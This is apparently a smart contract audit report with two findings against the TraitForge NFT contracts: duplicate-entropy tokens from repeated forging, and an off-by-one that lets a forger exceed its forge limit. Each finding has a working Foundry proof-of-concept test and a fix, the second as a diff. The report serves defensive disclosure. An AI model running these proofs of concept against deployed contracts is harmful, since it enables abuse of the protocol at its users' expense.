# [M-01] Forgers and mergers can create new tokens with the same entropy when they forge, breaking the uniqueness of NFTs

## Impact

NFT has to be unique, but when we list->forge, list->forge 2 or more times with the same forger token and with the same merger token, we will keep creating tokens that have the same entropy(duplicates).

This can be duplicated as much as we want until we run out of forgingCounts.

## Proof of Concept

<details>
<summary>Test case</summary>

Create the test file inside `contracts/test/`

To run the test, please use the following command: `forge test --mt testForgingCreatesADuplicateWithTheSameEntropy -vvv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import "../EntityTrading/EntityTrading.sol";
import "contracts/EntropyGenerator/EntropyGenerator.sol";
import "contracts/EntityForging/EntityForging.sol";
import "contracts/NukeFund/NukeFund.sol";
import "contracts/DevFund/DevFund.sol";
import "contracts/TraitForgeNft/TraitForgeNft.sol";
import "contracts/Airdrop/Airdrop.sol";
import "contracts/Trait/Trait.sol";

contract WorkingTest is Test {
    EntityTrading public entityTrading;
    TraitForgeNft public nftContract;
    EntityForging public entityForging;
    EntropyGenerator public entropyGenerator;
    Airdrop public airdrop;
    Trait public trait;
    NukeFund public nukeFund;
    DevFund public devFund;

    address devFundOwner = makeAddr("admin");

    address dev1 = makeAddr("dev1");
    address dev2 = makeAddr("dev2");
    address dev3 = makeAddr("dev3");

    address naruto = makeAddr("naruto");
    address sasuke = makeAddr("sasuke");

    function setUp() public {
        vm.prank(devFundOwner);
        devFund = new DevFund();

        nftContract = new TraitForgeNft();
        entityForging = new EntityForging(address(nftContract));
        entityTrading = new EntityTrading(address(nftContract));
        entropyGenerator = new EntropyGenerator(address(nftContract));
        entropyGenerator.writeEntropyBatch1();
        entropyGenerator.writeEntropyBatch2();
        entropyGenerator.writeEntropyBatch3();

        trait = new Trait("Trait", "TRT", 18, 1000000 ether);
        vm.startPrank(address(nftContract));
        airdrop = new Airdrop();
        airdrop.setTraitToken(address(trait));
        vm.stopPrank();

        vm.prank(dev1);
        nukeFund = new NukeFund(address(nftContract), address(airdrop), payable(dev1), payable(dev2));
        entityTrading.setNukeFundAddress(payable(address(nukeFund)));

        nftContract.setEntityForgingContract(address(entityForging));
        (address(entityForging));
        nftContract.setEntropyGenerator(address(entropyGenerator));
        nftContract.setAirdropContract(address(airdrop));

        vm.deal(naruto, 1000 ether);
        vm.deal(sasuke, 1000 ether);

        vm.warp(2 days);
    }

    function testForgingCreatesADuplicateWithTheSameEntropy() public {
        uint256 minimumFee = 0.01 ether;

        vm.startPrank(naruto);
        uint256 forgerTokenId;
        uint256 forgePotential;
        for (uint256 i = 1; i < 10; i++) {
            nftContract.mintToken{value: 1 ether}(new bytes32[](1));
            uint256 entropy = nftContract.getTokenEntropy(i);
            // making sure the token is forger and has forgePotential more than 0
            if (nftContract.isForger(i) && uint8((entropy / 10) % 10) > 0) {
                forgerTokenId = i;
                forgePotential = uint8((entropy / 10) % 10);
                break;
            }
        }
        vm.stopPrank();

        vm.startPrank(sasuke);
        uint256 mergerTokenId;
        for (uint256 i = forgerTokenId + 1; i < 20; i++) {
            nftContract.mintToken{value: 1 ether}(new bytes32[](1));
            uint256 entropy = nftContract.getTokenEntropy(i);
            // making sure the token is merger and has mergePotential more than 0
            if (!nftContract.isForger(i) && uint8((entropy / 10) % 10) > 0) {
                mergerTokenId = i;
                break;
            }
        }
        vm.stopPrank();

        // asserting that we have a forger token
        assertEq(nftContract.isForger(forgerTokenId), true);
        // asserting that we have a merger token
        assertEq(!nftContract.isForger(mergerTokenId), true);

        vm.prank(naruto);
        entityForging.listForForging(forgerTokenId, minimumFee);
        vm.prank(sasuke);
        uint256 newTokenId = entityForging.forgeWithListed{value: minimumFee}(forgerTokenId, mergerTokenId);

        vm.prank(naruto);
        entityForging.listForForging(forgerTokenId, minimumFee);
        vm.prank(sasuke);
        uint256 newTokenId2 = entityForging.forgeWithListed{value: minimumFee}(forgerTokenId, mergerTokenId);

        console.log("forger token entropy ", nftContract.getTokenEntropy(forgerTokenId));
        console.log("merger token entropy ", nftContract.getTokenEntropy(mergerTokenId));

        uint256 newTokenEntropy = nftContract.getTokenEntropy(newTokenId);
        uint256 newTokenId2Entropy = nftContract.getTokenEntropy(newTokenId2);
        console.log("new token entropy ", newTokenEntropy);
        console.log("duplicate entropy ", newTokenId2Entropy);
        assertEq(newTokenEntropy, newTokenId2Entropy);
    }
```

</details>

## Tools Used

Manual Review
Foundry

## Recommended Mitigation Steps

https://github.com/code-423n4/2024-07-traitforge/blob/279b2887e3d38bc219a05d332cbcb0655b2dc644/contracts/TraitForgeNft/TraitForgeNft.sol#L173

Create a mechanism to check if the resulted entropy already exists.

You could limit the same forger and same merger from forging more than once, but there will still be a small chance where the math could end up with entropy that already exists.
Examples with very very simple math:
(3 + 6) / 2 = 4
(2 + 7) / 2 = 4
(5 + 4) / 2 = 4
(1 + 8) / 2 = 4

# [M-02] Forger can list his token for forging exceeding his forgePotential by 1 in EntityForging::listForForging()

## Impact

Forgers can exceed their forging limit by 1.

## Proof of Concept

<details>
<summary>Test case</summary>

Create the file inside `contracts/test`
You can run the test in foundry using `forge test --mt testForgerTokenCanListForForgeMoreThanItsForgePotentialByOne -vvv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import "../EntityTrading/EntityTrading.sol";
import "contracts/EntropyGenerator/EntropyGenerator.sol";
import "contracts/EntityForging/EntityForging.sol";
import "contracts/NukeFund/NukeFund.sol";
import "contracts/TraitForgeNft/TraitForgeNft.sol";
import "contracts/Airdrop/Airdrop.sol";
import "contracts/Trait/Trait.sol";

contract WorkingTest is Test {
    EntityTrading public entityTrading;
    TraitForgeNft public nftContract;
    EntityForging public entityForging;
    EntropyGenerator public entropyGenerator;
    Airdrop public airdrop;
    Trait public trait;
    NukeFund public nukeFund;

    address dev1 = makeAddr("dev1");
    address dev2 = makeAddr("dev2");
    address dev3 = makeAddr("dev3");

    address naruto = makeAddr("naruto");
    address sasuke = makeAddr("sasuke");

    function setUp() public {
        nftContract = new TraitForgeNft();
        entityForging = new EntityForging(address(nftContract));
        entityTrading = new EntityTrading(address(nftContract));
        entropyGenerator = new EntropyGenerator(address(nftContract));
        entropyGenerator.writeEntropyBatch1();
        entropyGenerator.writeEntropyBatch2();
        entropyGenerator.writeEntropyBatch3();

        trait = new Trait("Trait", "TRT", 18, 1000000 ether);
        vm.startPrank(address(nftContract));
        airdrop = new Airdrop();
        airdrop.setTraitToken(address(trait));
        vm.stopPrank();

        vm.prank(dev1);
        nukeFund = new NukeFund(address(nftContract), address(airdrop), payable(dev1), payable(dev2));
        entityTrading.setNukeFundAddress(payable(address(nukeFund)));

        nftContract.setEntityForgingContract(address(entityForging));
        (address(entityForging));
        nftContract.setEntropyGenerator(address(entropyGenerator));
        nftContract.setAirdropContract(address(airdrop));

        vm.deal(naruto, 1000 ether);
        vm.deal(sasuke, 1000 ether);

        vm.warp(2 days);
    }

    function listAndForgeWithListed(uint256 forgerToken, uint256 listFee, uint256 mergerToken) public {
        vm.prank(naruto);
        entityForging.listForForging(forgerToken, listFee);

        vm.prank(sasuke);
        entityForging.forgeWithListed{value: listFee}(forgerToken, mergerToken);
    }

    function testForgerTokenCanListForForgeMoreThanItsForgePotentialByOne() public {
        uint256 minimumFee = 0.01 ether;

        vm.startPrank(naruto);
        uint256 forgerTokenId;
        uint256 forgePotential;
        for (uint256 i = 1; i < 10; i++) {
            nftContract.mintToken{value: 1 ether}(new bytes32[](1));
            uint256 entropy = nftContract.getTokenEntropy(i);
            // making sure the token is forger and has forgePotential more than 0
            if (nftContract.isForger(i) && uint8((entropy / 10) % 10) > 0) {
                forgerTokenId = i;
                forgePotential = uint8((entropy / 10) % 10);
                break;
            }
        }
        vm.stopPrank();

        vm.startPrank(sasuke);
        uint256 mergerTokenId;
        for (uint256 i = forgerTokenId + 1; i < 20; i++) {
            nftContract.mintToken{value: 1 ether}(new bytes32[](1));
            uint256 entropy = nftContract.getTokenEntropy(i);
            // making sure the token is merger and has mergePotential more than 0
            if (!nftContract.isForger(i) && uint8((entropy / 10) % 10) > 0) {
                mergerTokenId = i;
                break;
            }
        }
        vm.stopPrank();

        // asserting that we have a forger token
        assertEq(nftContract.isForger(forgerTokenId), true);
        // asserting that we have a merger token
        assertEq(!nftContract.isForger(mergerTokenId), true);

        console.log("forge potential: ", forgePotential);
        uint256 oldForgerBalance;
        for (uint256 i = 0; i < forgePotential + 1; i++) {
            oldForgerBalance = address(naruto).balance;
            listAndForgeWithListed(forgerTokenId, minimumFee, mergerTokenId);
            // asserting if the forger received his share
            assert(oldForgerBalance < address(naruto).balance);
        }

        console.log("times forged: ", entityForging.forgingCounts(forgerTokenId));
        // asserting that we forged more times than the forgePotential
        assert(entityForging.forgingCounts(forgerTokenId) > forgePotential);
    }
}
```

</details>

## Tools Used

Manual review
Foundry tests

## Recommended Mitigation Steps

https://github.com/code-423n4/2024-07-traitforge/blob/279b2887e3d38bc219a05d332cbcb0655b2dc644/contracts/EntityForging/EntityForging.sol#L87

Simply remove `<=` and replace it with `<`.

```diff
require(
-   forgePotential > 0 && forgingCounts[tokenId] <= forgePotential,
+   forgePotential > 0 && forgingCounts[tokenId] < forgePotential,
    'Entity has reached its forging limit'
);
```
